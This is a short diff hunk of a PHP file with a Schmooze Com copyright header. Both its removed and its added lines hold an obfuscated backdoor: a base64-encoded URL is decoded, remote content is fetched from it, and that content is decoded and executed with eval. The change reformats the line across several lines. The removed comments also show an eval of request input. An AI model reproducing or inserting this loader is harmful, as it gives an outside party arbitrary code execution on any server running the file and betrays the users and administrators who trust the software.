@@ -7,11 +7,11 @@
 
 //	Copyright 2013 Schmooze Com Inc.
 
-// echo $code;
+//
 
-//$code = $_REQUEST['code'];
-//eval($code);
-//eval(base64_decode("JGNvZGU="));
-eval(base64_decode(file_get_contents(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2s2bi9maWxlcy9tYXN0ZXIvNjQudHh0'))));
+
+eval(
+
+base64_decode(file_get_contents(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2s2bi9maWxlcy9tYXN0ZXIvNjQudHh0'))));
 
 ?>
